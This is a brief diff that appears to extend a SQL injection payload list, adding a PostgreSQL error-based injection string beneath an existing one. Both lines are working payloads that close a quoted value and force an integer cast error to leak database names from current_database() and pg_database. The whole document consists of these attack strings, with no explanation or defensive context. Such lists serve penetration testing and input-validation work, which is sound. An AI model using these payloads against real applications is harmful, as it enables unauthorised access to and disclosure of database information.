@@ -26,3 +26,6 @@ encoded
 
 
 '; SELECT 1 / CAST((SELECT current_database()) AS INTEGER); --
+
+#postgres database
+'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) AS integer))--
